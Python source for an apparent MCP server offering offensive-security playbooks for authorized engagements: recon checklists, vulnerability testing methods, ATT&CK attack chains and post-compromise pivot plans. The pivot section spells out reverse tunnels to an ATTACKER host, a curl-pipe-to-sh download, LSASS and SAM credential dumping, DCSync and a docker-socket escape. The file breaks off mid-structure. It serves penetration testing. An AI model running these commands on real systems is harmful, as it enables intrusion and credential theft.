"""Offensive security tools — recon, vuln assessment, attack chains, pivoting, cheatsheets, threat models."""

from rick_mcp.constants import CALLSIGN
from rick_mcp.formatting import _fmt, _safe_tool, _sanitize
from rick_mcp.models import (
    AttackChainInput,
    CheatsheetInput,
    PivotInput,
    ReconInput,
    ThreatModelInput,
    ToolRecInput,
    VulnInput,
)


async def rick_recon(params: ReconInput) -> str:
    """Systematic recon methodology for 8 target types. Passive + active phases with tool recs."""
    pb = {
        "web_app": {
            "phase": "Web Application",
            "passive": [
                "WHOIS/DNS enumeration",
                "Subdomain enum (Amass, Subfinder, crt.sh)",
                "Google dorking",
                "Wayback Machine endpoints",
                "GitHub recon for creds/keys",
                "SSL cert transparency",
                "Shodan/Censys",
            ],
            "active": [
                "Full port scan (Nmap)",
                "Tech fingerprinting (WhatWeb)",
                "Dir brute-force (ffuf, Gobuster)",
                "Vhost enumeration",
                "API endpoint discovery",
                "WAF detection (wafw00f)",
                "CMS identification",
                "JS file analysis for endpoints/secrets",
            ],
            "tools": ["Burp Suite", "ffuf", "Gobuster", "Amass", "Nmap", "Nuclei"],
            "rick_note": "Start passive. Don't touch the target until OSINT is exhausted. Builder's eye — understand the architecture before testing the joints.",
        },
        "network": {
            "phase": "Network Infrastructure",
            "passive": [
                "Network range ID (ARIN, BGP)",
                "DNS zone transfers",
                "Shodan/Censys",
                "Employee OSINT for VPN endpoints",
            ],
            "active": [
                "Host discovery (ping sweep, ARP)",
                "Full TCP scan (-sS -sV -sC -p-)",
                "Top 100 UDP",
                "Service/OS fingerprinting",
                "SNMP enum",
                "SMB enum (enum4linux-ng, CME)",
                "LDAP enum",
                "Share discovery",
            ],
            "tools": ["Nmap", "CrackMapExec", "enum4linux-ng", "Responder", "Wireshark", "masscan"],
            "rick_note": "Full port scans. Critical vulns hide on high ports. Map the entire terrain before engaging.",
        },
        "cloud_azure": {
            "phase": "Azure Cloud",
            "passive": [
                "Tenant enumeration",
                "Subdomain enum (*.azurewebsites.net, *.blob.core.windows.net)",
                "Public blob discovery",
                "Azure AD user enum",
                "M365 config checks",
            ],
            "active": [
                "Auth testing",
                "Resource enum (Az CLI)",
                "Storage access testing",
                "Container Apps/AKS discovery",
                "Key Vault access policies",
                "Service principal analysis",
                "DevOps repo access",
                "Function/Logic App endpoints",
            ],
            "tools": ["Az CLI", "ROADtools", "AADInternals", "MicroBurst", "ScoutSuite", "Prowler"],
            "rick_note": "Check misconfigured storage and overpermissioned service principals. IAM is where the money shots are.",
        },
        "cloud_aws": {
            "phase": "AWS Cloud",
            "passive": ["S3 bucket enum", "AWS IP ranges", "CloudFront distributions", "Public AMIs/snapshots"],
            "active": [
                "IAM privilege analysis",
                "S3 policy/ACL testing",
                "EC2 metadata (IMDS)",
                "Lambda env var extraction",
                "STS AssumeRole testing",
                "CloudTrail/GuardDuty config",
                "VPC/security groups",
                "Secrets Manager/SSM enum",
            ],
            "tools": ["AWS CLI", "Pacu", "ScoutSuite", "Prowler", "CloudMapper", "enumerate-iam"],
            "rick_note": "IAM policy analysis is where the money shots are. Metadata service = critical chain.",
        },
        "active_directory": {
            "phase": "Active Directory",
            "passive": [
                "User enum via RPC/LDAP",
                "Group membership analysis",
                "GPO analysis",
                "DNS records for services",
            ],
            "active": [
                "BloodHound collection",
                "Kerberoasting (SPN enum)",
                "AS-REP Roasting",
                "LDAP sensitive attributes",
                "SMB signing/relay surface",
                "Password policy enum",
                "Trust relationship mapping",
                "ADCS enum (ESC1-ESC8)",
                "LAPS config analysis",
            ],
            "tools": ["BloodHound", "Impacket", "CrackMapExec", "Rubeus", "Certify", "PowerView"],
            "rick_note": "BloodHound first, always. ADCS misconfigs are the new hotness. Map the domain like scouting frontier territory.",
        },
        "api": {
            "phase": "API Security",
            "passive": [
                "Swagger/OpenAPI discovery",
                "JS analysis for hidden endpoints",
                "GitHub search for API keys",
                "Wayback for deprecated versions",
            ],
            "active": [
                "Endpoint enum + method testing",
                "Auth mechanism analysis (JWT, OAuth)",
                "Rate limiting assessment",
                "Input validation testing",
                "BOLA/IDOR on all resources",
                "Mass assignment testing",
                "GraphQL introspection",
                "WebSocket discovery",
            ],
            "tools": ["Burp Suite", "Postman", "ffuf", "Arjun", "jwt_tool", "GraphQL Voyager"],
            "rick_note": "BOLA is #1 API vuln. Test every endpoint with different user contexts. Check every joint in the structure.",
        },
        "container": {
            "phase": "Container & Kubernetes",
            "passive": ["Registry enum (Docker Hub, ACR, ECR)", "K8s API server discovery", "Public Helm charts"],
            "active": [
                "Container escape vectors",
                "K8s RBAC enum",
                "Service account tokens",
                "Network policies",
                "Secrets review (etcd, mounted)",
                "Pod security contexts",
                "Ingress config",
                "Image vuln scanning",
            ],
            "tools": ["kubectl", "kube-hunter", "trivy", "grype", "kubeaudit", "peirates"],
            "rick_note": "Check for privileged containers and mounted service account tokens. Container security = construction inspection.",
        },
        "mobile": {
            "phase": "Mobile Application",
            "passive": ["App store analysis", "APK/IPA static analysis", "Developer OSINT", "SDK identification"],
            "active": [
                "Reverse engineering (jadx)",
                "Traffic interception (Burp + cert bypass)",
                "Local storage analysis",
                "API extraction from binary",
                "Runtime manipulation (Frida)",
                "Deep link analysis",
                "Biometric bypass testing",
            ],
            "tools": ["Burp Suite", "Frida", "Objection", "jadx", "MobSF", "Drozer"],
            "rick_note": "Cert pinning bypass + Frida is deadly. Check local storage for plaintext. Avionics-level teardown.",
        },
    }
    t = params.target_type.lower().strip()
    p = pb.get(t)
    if not p:
        return f"Error: Unknown target '{t}'. Available: {', '.join(pb.keys())}"
    if params.scope_notes:
        p["scope_notes"] = _sanitize(params.scope_notes)
    p["authorization"] = "AUTHORIZED ENGAGEMENTS ONLY"
    return _fmt(p, params.response_format, title=f"{CALLSIGN} Recon Playbook")


async def rick_vuln_assess(params: VulnInput) -> str:
    """Assessment methodology for 10 vulnerability categories. Testing techniques, tools, tactical notes."""
    fw = {
        "injection": {
            "cat": "Injection (SQLi, NoSQLi, Command, LDAP)",
            "owasp": "A03:2021",
            "testing": [
                "Identify all input points",
                "Error-based SQLi",
                "UNION-based extraction",
                "Blind SQLi (boolean + time)",
                "Second-order injection",
                "NoSQL operator injection",
                "Command injection metacharacters",
                "LDAP injection",
            ],
            "tools": ["SQLMap", "Burp Suite", "NoSQLMap"],
            "severity": "Critical",
            "rick_note": "Second-order SQLi is missed by scanners. Manual depth is non-negotiable here.",
        },
        "auth": {
            "cat": "Authentication & Session Management",
            "owasp": "A07:2021",
            "testing": [
                "Default/weak credentials",
                "Brute force resistance",
                "MFA bypass",
                "Session token entropy",
                "Session fixation/hijacking",
                "JWT flaws (alg:none, key confusion)",
                "OAuth/OIDC misconfig",
                "Password reset flow analysis",
            ],
            "tools": ["Burp Suite", "Hydra", "jwt_tool", "Hashcat"],
            "severity": "Critical to High",
            "rick_note": "JWT vulns are bread and butter. Check algorithm confusion. Test every auth boundary.",
        },
        "xss": {
            "cat": "Cross-Site Scripting",
            "owasp": "A03:2021",
            "testing": [
                "Map reflection points",
                "Output encoding context analysis",
                "Context-specific payloads",
                "DOM-based source/sink mapping",
                "mXSS sanitizer bypass",
                "Cookie flags (HttpOnly, Secure, SameSite)",
                "CSP bypass",
                "Stored XSS in persistent fields",
            ],
            "tools": ["Burp Suite", "dalfox", "XSStrike"],
            "severity": "Medium to High",
            "rick_note": "Demonstrate real impact, not just alert(1). Show the business what an attacker can actually do.",
        },
        "ssrf": {
            "cat": "Server-Side Request Forgery",
            "owasp": "A10:2021",
            "testing": [
                "Identify URL input params",
                "Internal network access (127.0.0.1, 169.254.169.254)",
                "Cloud metadata endpoints",
                "Protocol smuggling (gopher, file, dict)",
                "DNS rebinding",
                "Redirect-based SSRF",
                "Blind SSRF via OOB",
                "Internal port scanning",
            ],
            "tools": ["Burp Collaborator", "SSRFmap", "Gopherus"],
            "severity": "High to Critical",
            "rick_note": "SSRF to cloud metadata is a critical chain. Portal gun thinking — attack from unexpected dimensions.",
        },
        "idor": {
            "cat": "IDOR / Broken Access Control",
            "owasp": "A01:2021",
            "testing": [
                "Map resource identifiers",
                "Horizontal privesc",
                "Vertical privesc",
                "Parameter tampering",
                "Predictable IDs",
                "Multi-step auth bypass",
                "HTTP method manipulation",
                "Mass assignment",
            ],
            "tools": ["Burp Suite (Authorize)", "Postman"],
            "severity": "High to Critical",
            "rick_note": "BOLA is #1 API vuln. Test EVERY endpoint. Check every joint in the structure.",
        },
        "file_upload": {
            "cat": "File Upload",
            "owasp": "A04:2021",
            "testing": [
                "Extension bypass",
                "Content-Type manipulation",
                "Polyglot files",
                "Double extensions",
                "Null byte injection",
                "Race conditions",
                "Path traversal in filename",
                "SVG for stored XSS",
            ],
            "tools": ["Burp Suite", "ExifTool"],
            "severity": "High to Critical",
            "rick_note": "File upload to RCE via polyglot files. Get weird with it.",
        },
        "deserialization": {
            "cat": "Insecure Deserialization",
            "owasp": "A08:2021",
            "testing": [
                "Identify serialized data",
                "Java gadget chains (ysoserial)",
                ".NET deserialization",
                "PHP object injection",
                "Python pickle",
                "YAML attacks",
                "XXE injection",
                "Type juggling",
            ],
            "tools": ["ysoserial", "ysoserial.net", "Burp Suite"],
            "severity": "Critical",
            "rick_note": "Look for base64 blobs in cookies and hidden fields. The structural weakness hides in the foundation.",
        },
        "misconfig": {
            "cat": "Security Misconfiguration",
            "owasp": "A05:2021",
            "testing": [
                "Default credentials",
                "Verbose errors/stack traces",
                "Directory listing",
                "Security headers",
                "TLS config",
                "Cloud storage permissions",
                "Container misconfigs",
                "Exposed databases",
                "Debug endpoints",
            ],
            "tools": ["Nuclei", "Nikto", "testssl.sh", "ScoutSuite"],
            "severity": "Variable",
            "rick_note": "Run Nuclei with broad templates. Building inspector mindset — check every system, every config.",
        },
        "crypto": {
            "cat": "Cryptographic Failures",
            "owasp": "A02:2021",
            "testing": [
                "TLS assessment",
                "Cleartext transmission",
                "Weak password hashing",
                "Hardcoded keys",
                "Predictable RNG",
                "Padding oracle",
                "Key management",
                "Cert pinning review",
            ],
            "tools": ["testssl.sh", "Hashcat", "SSLscan"],
            "severity": "High",
            "rick_note": "Check JS files for hardcoded secrets. Crypto failures are foundation cracks — they compromise everything above.",
        },
        "privesc": {
            "cat": "Privilege Escalation (Linux & Windows)",
            "owasp": "A01:2021",
            "testing": [
                "SUID/SGID binaries",
                "Sudo misconfigs + GTFOBins",
                "Cron job analysis",
                "Kernel exploits",
                "Unquoted service paths (Win)",
                "Weak service permissions (Win)",
                "Token impersonation / Potato attacks",
                "DLL hijacking",
                "Registry autoruns",
                "AlwaysInstallElevated",
                "Credential harvesting",
                "ADCS certificate abuse",
            ],
            "tools": ["LinPEAS", "WinPEAS", "BloodHound", "PowerUp", "Certify", "Rubeus"],
            "severity": "High to Critical",
            "rick_note": "Run LinPEAS/WinPEAS immediately. ADCS abuse is incredibly powerful. Escalate like climbing — find every handhold.",
        },
    }
    c = params.vuln_category.lower().strip()
    f = fw.get(c)
    if not f:
        return f"Error: Unknown category '{c}'. Available: {', '.join(fw.keys())}"
    if params.context:
        f["context"] = _sanitize(params.context)
    f["authorization"] = "AUTHORIZED ENGAGEMENTS ONLY"
    return _fmt(f, params.response_format, title=f"{CALLSIGN} Vuln Assessment")


async def rick_attack_chain(params: AttackChainInput) -> str:
    """MITRE ATT&CK kill chain mapper. Maps attack chains from starting position to objective. Think in chains, not isolated vulns."""
    chains = {
        "external_to_da": {
            "objective": "External Perimeter to Domain Admin",
            "chain": [
                {
                    "tactic": "Reconnaissance (TA0043)",
                    "techniques": [
                        "Subdomain enumeration",
                        "Employee OSINT",
                        "Credential leak hunting (breach DBs)",
                        "LinkedIn org chart mapping",
                    ],
                    "tools": ["Amass", "Subfinder", "theHarvester", "Dehashed"],
                },
                {
                    "tactic": "Initial Access (TA0001)",
                    "techniques": [
                        "Exploit public-facing app (T1190)",
                        "Phishing attachment (T1566.001)",
                        "Valid accounts from leaks (T1078)",
                        "VPN/RDP brute force",
                    ],
                    "tools": ["Burp Suite", "Nuclei", "GoPhish", "Hydra"],
                },
                {
                    "tactic": "Execution (TA0002)",
                    "techniques": [
                        "Command/scripting interpreter (T1059)",
                        "Exploitation for client execution (T1203)",
                        "User execution of payload (T1204)",
                    ],
                    "tools": ["Metasploit", "Custom Python", "msfvenom"],
                },
                {
                    "tactic": "Persistence (TA0003)",
                    "techniques": [
                        "Web shell (T1505.003)",
                        "Scheduled task (T1053)",
                        "Registry run keys (T1547.001)",
                        "ADCS certificate persistence",
                    ],
                    "tools": ["Custom shells", "SharPersist", "Certify"],
                },
                {
                    "tactic": "Privilege Escalation (TA0004)",
                    "techniques": [
                        "Exploit ADCS misconfiguration (ESC1-ESC8)",
                        "Kerberoasting (T1558.003)",
                        "AS-REP Roasting",
                        "Token impersonation (T1134)",
                        "Potato attacks",
                    ],
                    "tools": ["Rubeus", "Certify", "PrintSpoofer", "GodPotato"],
                },
                {
                    "tactic": "Credential Access (TA0006)",
                    "techniques": ["LSASS dump (T1003.001)", "DCSync (T1003.006)", "Kerberoast crack", "NTLM relay"],
                    "tools": ["Mimikatz", "Impacket secretsdump", "Hashcat", "ntlmrelayx"],
                },
                {
                    "tactic": "Lateral Movement (TA0008)",
                    "techniques": ["Pass-the-hash (T1550.002)", "PSExec (T1569.002)", "WMI (T1047)", "RDP (T1021.001)"],
                    "tools": ["CrackMapExec", "Impacket", "Evil-WinRM"],
                },
                {
                    "tactic": "Domain Admin",
                    "techniques": [
                        "DCSync all hashes",
                        "Golden ticket (T1558.001)",
                        "Skeleton key",
                        "AdminSDHolder abuse",
                    ],
                    "tools": ["Impacket", "Mimikatz", "BloodHound for path validation"],
                },
            ],
            "rick_note": "This is the classic chain. ADCS is the shortcut most people miss. BloodHound maps the path — you walk it.",
        },
        "phishing_to_lateral": {
            "objective": "Phishing Foothold to Lateral Movement",
            "chain": [
                {
                    "tactic": "Initial Access (TA0001)",
                    "techniques": [
                        "Spearphishing attachment (T1566.001)",
                        "HTML smuggling (T1027.006)",
                        "ISO/LNK payloads bypassing MOTW",
                        "QR code phishing",
                    ],
                    "tools": ["GoPhish", "Custom payloads", "Evilginx2"],
                },
                {
                    "tactic": "Execution (TA0002)",
                    "techniques": [
                        "PowerShell (T1059.001)",
                        "VBA macro execution",
                        "DLL side-loading (T1574.002)",
                        "ClickOnce deployment",
                    ],
                    "tools": ["Custom PS scripts", "msfvenom", "Donut"],
                },
                {
                    "tactic": "Defense Evasion (TA0005)",
                    "techniques": [
                        "AMSI bypass (T1562.001)",
                        "ETW patching",
                        "Process hollowing (T1055.012)",
                        "Timestomping (T1070.006)",
                    ],
                    "tools": ["Custom loaders", "ScareCrow", "Artifact Kit"],
                },
                {
                    "tactic": "Discovery (TA0007)",
                    "techniques": [
                        "Domain trust discovery (T1482)",
                        "Network share enum (T1135)",
                        "Permission group discovery (T1069)",
                        "System info (T1082)",
                    ],
                    "tools": ["BloodHound", "PowerView", "ADRecon"],
                },
                {
                    "tactic": "Credential Access (TA0006)",
                    "techniques": [
                        "LSASS access (T1003.001)",
                        "Credential manager (T1555.004)",
                        "Browser saved creds (T1555.003)",
                        "Token theft",
                    ],
                    "tools": ["Mimikatz", "SharpChrome", "Rubeus"],
                },
                {
                    "tactic": "Lateral Movement (TA0008)",
                    "techniques": [
                        "SMB/admin shares (T1021.002)",
                        "WinRM (T1021.006)",
                        "DCOM (T1021.003)",
                        "RDP hijacking",
                    ],
                    "tools": ["CrackMapExec", "Evil-WinRM", "Impacket"],
                },
            ],
            "rick_note": "The phishing chain is about speed after landing. Enumerate fast, escalate faster, move before EDR catches up.",
        },
        "web_to_internal": {
            "objective": "Web Application to Internal Network Access",
            "chain": [
                {
                    "tactic": "Initial Access (TA0001)",
                    "techniques": [
                        "SQL injection to OS command (T1190)",
                        "File upload to web shell",
                        "SSRF to internal services",
                        "Deserialization RCE",
                    ],
                    "tools": ["Burp Suite", "SQLMap", "Custom shells"],
                },
                {
                    "tactic": "Execution (TA0002)",
                    "techniques": [
                        "Web shell command execution",
                        "Reverse shell callback",
                        "Scheduled task creation",
                        "Database command execution (xp_cmdshell, COPY TO)",
                    ],
                    "tools": ["Custom shells", "netcat/socat", "Metasploit"],
                },
                {
                    "tactic": "Discovery (TA0007)",
                    "techniques": [
                        "Internal network scanning from web server",
                        "Database credential harvesting",
                        "Config file enumeration",
                        "Cloud metadata (169.254.169.254)",
                    ],
                    "tools": ["Nmap (from pivot)", "Custom scripts"],
                },
                {
                    "tactic": "Credential Access (TA0006)",
                    "techniques": [
                        "Database connection strings",
                        "Config files with creds",
                        "Environment variables",
                        "Service account tokens",
                        "Cloud instance metadata IAM",
                    ],
                    "tools": ["Custom enumeration", "cloud CLI tools"],
                },
                {
                    "tactic": "Pivoting",
                    "techniques": [
                        "SOCKS proxy through web shell",
                        "Reverse SSH tunnel",
                        "Chisel/Ligolo-ng tunnel",
                        "DNS tunneling",
                    ],
                    "tools": ["Chisel", "Ligolo-ng", "SSH", "dnscat2"],
                },
                {
                    "tactic": "Lateral Movement (TA0008)",
                    "techniques": [
                        "Pivot to internal hosts via tunnel",
                        "Credential reuse across services",
                        "Database link crawling",
                        "Cloud pivot to other services",
                    ],
                    "tools": ["Proxychains + CrackMapExec", "Impacket through tunnel"],
                },
            ],
            "rick_note": "Web to internal is the bread and butter. SSRF to cloud metadata is the fast lane. The tunnel is the bridge — Chisel or Ligolo-ng, pick your weapon.",
        },
        "cloud_to_onprem": {
            "objective": "Cloud Compromise to On-Premises Access",
            "chain": [
                {
                    "tactic": "Initial Access (TA0001)",
                    "techniques": [
                        "Compromised cloud credentials",
                        "OAuth app consent phishing",
                        "Misconfigured storage/permissions",
                        "Exposed cloud management APIs",
                    ],
                    "tools": ["Az CLI", "AWS CLI", "ROADtools"],
                },
                {
                    "tactic": "Privilege Escalation (TA0004)",
                    "techniques": [
                        "Service principal abuse",
                        "IAM policy escalation",
                        "Managed identity exploitation",
                        "Cross-account role assumption",
                    ],
                    "tools": ["Pacu", "MicroBurst", "ScoutSuite"],
                },
                {
                    "tactic": "Discovery (TA0007)",
                    "techniques": [
                        "Enumerate hybrid AD connect",
                        "Find VPN/ExpressRoute/DirectConnect configs",
                        "Map cloud-to-onprem trust relationships",
                        "Identify sync accounts",
                    ],
                    "tools": ["ROADtools", "AADInternals", "Az CLI"],
                },
                {
                    "tactic": "Credential Access (TA0006)",
                    "techniques": [
                        "Extract Azure AD Connect sync creds",
                        "Key Vault secret extraction",
                        "Secrets Manager/SSM parameters",
                        "Token theft from cloud workloads",
                    ],
                    "tools": ["AADInternals", "Az CLI", "AWS CLI"],
                },
                {
                    "tactic": "Lateral to On-Prem",
                    "techniques": [
                        "Use sync account creds on-prem",
                        "VPN access with cloud creds",
                        "Azure AD joined device PRT abuse",
                        "Pass cloud tokens to on-prem services",
                    ],
                    "tools": ["Impacket", "Evil-WinRM", "AADInternals"],
                },
            ],
            "rick_note": "Hybrid environments are the goldmine. Azure AD Connect sync accounts often have DCSync rights. Cloud is the new perimeter — and most orgs don't know it.",
        },
        "insider_threat": {
            "objective": "Insider Threat Simulation (Authorized)",
            "chain": [
                {
                    "tactic": "Starting Position",
                    "techniques": [
                        "Standard domain user credentials",
                        "Corporate workstation access",
                        "VPN/remote access",
                        "Email access",
                    ],
                    "tools": ["Standard corporate tools"],
                },
                {
                    "tactic": "Discovery (TA0007)",
                    "techniques": [
                        "BloodHound enumeration",
                        "Share permission analysis",
                        "Sensitive file discovery (T1083)",
                        "Email/Teams data mining",
                        "Org chart analysis",
                    ],
                    "tools": ["BloodHound", "Snaffler", "PowerView"],
                },
                {
                    "tactic": "Collection (TA0009)",
                    "techniques": [
                        "Sensitive data in shares (T1039)",
                        "Email collection (T1114)",
                        "Database access with app creds",
                        "Source code access",
                        "Cloud storage enumeration",
                    ],
                    "tools": ["Snaffler", "Custom scripts", "Git"],
                },
                {
                    "tactic": "Privilege Escalation (TA0004)",
                    "techniques": [
                        "Kerberoasting (T1558.003)",
                        "AS-REP Roasting",
                        "ADCS abuse",
                        "Local admin reuse",
                        "GPP passwords",
                    ],
                    "tools": ["Rubeus", "Certify", "CrackMapExec"],
                },
                {
                    "tactic": "Exfiltration (TA0010)",
                    "techniques": [
                        "Data staging (T1074)",
                        "Exfil over web (T1048.002)",
                        "DNS exfiltration",
                        "Cloud sync exfil",
                    ],
                    "tools": ["Custom scripts", "rclone"],
                },
            ],
            "rick_note": "Insider sims prove what a disgruntled employee with a badge can do. Snaffler finds the crown jewels on shares. Usually takes less than a day to find sensitive data.",
        },
        "supply_chain": {
            "objective": "Supply Chain Attack Simulation",
            "chain": [
                {
                    "tactic": "Reconnaissance (TA0043)",
                    "techniques": [
                        "Third-party vendor mapping",
                        "Software dependency analysis",
                        "CI/CD pipeline enumeration",
                        "Package registry analysis",
                    ],
                    "tools": ["Custom OSINT", "Snyk", "npm audit"],
                },
                {
                    "tactic": "Initial Access (TA0001)",
                    "techniques": [
                        "Compromised dependency (T1195.002)",
                        "CI/CD pipeline injection",
                        "Typosquatting packages",
                        "Compromised build tooling",
                    ],
                    "tools": ["Custom analysis", "Dependency-Track"],
                },
                {
                    "tactic": "Execution (TA0002)",
                    "techniques": [
                        "Malicious package install scripts",
                        "Build pipeline code injection",
                        "Compromised container images",
                        "Git hook manipulation",
                    ],
                    "tools": ["Custom payloads"],
                },
                {
                    "tactic": "Persistence (TA0003)",
                    "techniques": [
                        "Backdoored dependency pinning",
                        "CI/CD webhook persistence",
                        "Container image tagging",
                        "Compromised signing keys",
                    ],
                    "tools": ["Custom tooling"],
                },
                {
                    "tactic": "Impact Assessment",
                    "techniques": [
                        "Blast radius analysis",
                        "Downstream consumer mapping",
                        "Data flow tracking",
                        "Trust boundary analysis",
                    ],
                    "tools": ["Custom analysis", "SBOM tools"],
                },
            ],
            "rick_note": "Supply chain is the frontier. Most orgs trust their dependencies blindly. CI/CD pipelines are the new domain admin — compromise the build, own everything downstream.",
        },
    }
    s = params.scenario.lower().strip()
    chain = chains.get(s)
    if not chain:
        return f"Error: Unknown scenario '{s}'. Available: {', '.join(chains.keys())}"
    if params.target_environment:
        chain["target_environment"] = params.target_environment
    chain["authorization"] = "AUTHORIZED ENGAGEMENTS ONLY — Attack chains are for planning authorized operations."
    chain["mitre_reference"] = "https://attack.mitre.org/"
    return _fmt(chain, params.response_format, title=f"{CALLSIGN} Attack Chain")


async def rick_pivot_plan(params: PivotInput) -> str:
    """'I'm in, now what?' Pivoting and lateral movement playbook by compromised position. Tunneling, proxying, credential reuse."""
    plans: dict[str, dict[str, object]] = {
        "linux_webserver": {
            "position": "Compromised Linux Web Server",
            "immediate_actions": [
                "whoami && id — know your user and groups",
                "ip addr / ifconfig — identify all network interfaces (dual-homed?)",
                "cat /etc/passwd — enumerate local users",
                "env / printenv — check for creds in environment variables",
                "find / -name '*.conf' -o -name '*.config' -o -name '*.env' 2>/dev/null — config files with creds",
                "cat /proc/net/arp — identify adjacent hosts",
                "ss -tlnp / netstat -tlnp — listening services and established connections",
                "mount / df -h — mounted filesystems, NFS shares",
                "crontab -l && ls -la /etc/cron* — scheduled tasks",
            ],
            "credential_hunting": [
                "Database connection strings in web app configs",
                ".bash_history for passwords in commands",
                "SSH keys (~/.ssh/id_rsa, authorized_keys)",
                "/var/www/ config files (wp-config.php, .env, settings.py)",
                "Docker environment variables / docker inspect",
                "Cloud metadata: curl http://169.254.169.254/latest/meta-data/iam/",
                "/etc/shadow if readable (rare but check)",
                "Credential files: /opt/, /tmp/, /var/backups/",
            ],
            "tunneling": {
                "chisel": "# On attacker: chisel server -p 8080 --reverse\n# On target: ./chisel client ATTACKER:8080 R:socks",
                "ligolo_ng": "# On attacker: ligolo-proxy -selfcert\n# On target: ./ligolo-agent -connect ATTACKER:11601 -ignore-cert",
                "ssh_dynamic": "ssh -D 9050 -N -f user@pivot_host  # SOCKS proxy",
                "ssh_local": "ssh -L 8445:INTERNAL_TARGET:445 user@pivot  # Port forward specific service",
                "ssh_reverse": "ssh -R 9050 user@attacker  # Reverse SOCKS from target to you",
            },
            "lateral_movement": [
                "SSH with harvested keys/creds to other Linux hosts",
                "Database connections to internal DB servers",
                "NFS/SMB mounts to access file shares",
                "Proxychains + nmap through SOCKS tunnel for internal scanning",
                "Ansible/Salt/Puppet — check for config management with stored creds",
            ],
            "privesc_quick_check": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            "rick_note": "Web servers are the beach head. They're dual-homed more often than you think. Check every interface, every config file. The database creds in wp-config.php are worth more than the web shell.",
        },
        "windows_workstation": {
            "position": "Compromised Windows Workstation",
            "immediate_actions": [
                "whoami /all — user, groups, privileges",
                "ipconfig /all — interfaces, DNS, domain info",
                "net user /domain — domain user enumeration",
                "net group 'Domain Admins' /domain — who's DA",
                "systeminfo — OS version, patches, hotfixes",
                "tasklist /v — running processes (AV, EDR?)",
                "netstat -ano — connections and listening ports",
                "arp -a — adjacent hosts",
                "cmdkey /list — stored credentials",
                "dir C:\\Users\\ — who logs into this machine",
            ],
            "credential_hunting": [
                "cmdkey /list — Windows credential manager",
                "dir /s /b C:\\Users\\*password* C:\\Users\\*cred* — credential files",
                "Browser saved passwords (SharpChrome, SharpWeb)",
                "WiFi passwords: netsh wlan show profiles / export",
                "KeePass databases: dir /s /b *.kdbx",
                "Check Sticky Notes: C:\\Users\\*\\AppData\\Local\\Packages\\*StickyNotes*",
                "DPAPI blobs for master key decryption",
                "Vault credentials",
            ],
            "tunneling": {
                "chisel": "# chisel.exe client ATTACKER:8080 R:socks",
                "ligolo_ng": "# ligolo-agent.exe -connect ATTACKER:11601 -ignore-cert",
                "netsh_portfwd": "netsh interface portproxy add v4tov4 listenport=8445 listenaddress=0.0.0.0 connectport=445 connectaddress=INTERNAL_TARGET",
                "ssh_exe": "# Windows 10+ has built-in SSH: ssh -D 9050 -N user@attacker",
            },
            "lateral_movement": [
                "CrackMapExec: cme smb SUBNET/24 -u USER -p PASS — spray and pray",
                "Evil-WinRM: evil-winrm -i TARGET -u USER -p PASS",
                "PsExec: impacket-psexec DOMAIN/USER:PASS@TARGET",
                "WMI: impacket-wmiexec DOMAIN/USER:PASS@TARGET",
                "RDP: if you have GUI, xfreerdp or rdesktop through tunnel",
                "Pass-the-Hash: cme smb TARGET -u USER -H NTHASH",
                "DCOM: impacket-dcomexec DOMAIN/USER:PASS@TARGET",
            ],
            "privesc_quick_check": "# Upload and run WinPEAS\n# Or: PowerUp.ps1 — Invoke-AllChecks",
            "rick_note": "Workstations are credential goldmines. Users save passwords everywhere — browsers, KeePass, sticky notes, cmdkey. Harvest everything before you move.",
        },
        "windows_server": {
            "position": "Compromised Windows Server",
            "immediate_actions": [
                "whoami /all — check for SeImpersonatePrivilege, SeBackupPrivilege",
                "systeminfo — DC? Member server? Patch level?",
                "net group 'Domain Controllers' /domain — identify all DCs",
                "nltest /dclist:DOMAIN — DC enumeration",
                "Get-ADDomain / Get-ADForest — if PowerShell available",
                "tasklist /v — identify services, AV/EDR",
                "sc query — all services and their accounts",
                "netstat -ano — internal connections reveal infrastructure",
            ],
            "credential_hunting": [
                "LSASS dump: procdump -ma lsass.exe lsass.dmp (or comsvcs.dll MiniDump)",
                "SAM/SYSTEM/SECURITY: reg save HKLM\\SAM sam.bak",
                "NTDS.dit if DC: ntdsutil / Volume Shadow Copy",
                "DCSync if DA: impacket-secretsdump DOMAIN/DA:PASS@DC",
                "Service account credentials in registry",
                "IIS application pool identities",
                "SQL Server service accounts and linked servers",
                "Scheduled tasks running as privileged accounts",
                "GPP passwords (legacy but still found): Get-GPPPassword",
            ],
            "tunneling": {
                "chisel": "# chisel.exe client ATTACKER:8080 R:socks",
                "ligolo_ng": "# ligolo-agent.exe -connect ATTACKER:11601 -ignore-cert",
                "netsh_portfwd": "netsh interface portproxy add v4tov4 listenport=LOCAL connectport=REMOTE_PORT connectaddress=REMOTE_HOST",
            },
            "lateral_movement": [
                "DCSync all accounts if Domain Admin",
                "Golden Ticket for persistent domain access",
                "Silver Tickets for specific service access",
                "ADCS certificate request for any user",
                "AdminSDHolder modification for persistent DA",
                "Print Spooler abuse for relay to other DCs",
                "Trust relationship abuse for cross-forest",
            ],
            "rick_note": "If it's a DC, game over — DCSync everything. If it's a member server, hunt service account creds and SQL linked servers. Servers talk to other servers — follow the connections.",
        },
        "container": {
            "position": "Compromised Container (Docker/K8s Pod)",
            "immediate_actions": [
                "id — am I root in the container?",
                "cat /proc/1/cgroup — confirm containerized",
                "mount — check for sensitive mounts (/var/run/docker.sock!)",
                "env — environment variables with secrets",
                "cat /var/run/secrets/kubernetes.io/serviceaccount/token — K8s SA token",
                "ls -la /var/run/docker.sock — Docker socket mounted?",
                "ip addr — network interfaces, what network am I on?",
                "cat /etc/resolv.conf — DNS reveals cluster info",
                "df -h — volume mounts from host",
            ],
            "escape_vectors": [
                "Docker socket mounted → docker run -v /:/host --privileged → full host access",
                "Privileged container → mount host filesystem, load kernel modules",
                "CAP_SYS_ADMIN → mount cgroup escape (notify_on_release)",
                "Host PID namespace → nsenter to host",
                "Writable hostPath volumes → write to host filesystem",
                "K8s service account with cluster-admin → kubectl get secrets --all-namespaces",
            ],
            "credential_hunting": [
                "Environment variables (env | grep -i pass\\|key\\|secret\\|token)",
                "K8s secrets: kubectl get secrets (if SA has permissions)",
                "ConfigMaps with credentials",
                "Cloud metadata: curl http://169.254.169.254/",
                "Mounted volume files",
                "Docker image layers (history reveals build-time secrets)",
            ],
            "lateral_movement": [
                "K8s service account → enumerate and access other pods/namespaces",
                "Internal cluster DNS → discover services",
                "Cloud metadata IAM role → pivot to cloud resources",
                "Network scanning within cluster overlay network",
                "Access other containers via docker exec (if socket mounted)",
            ],
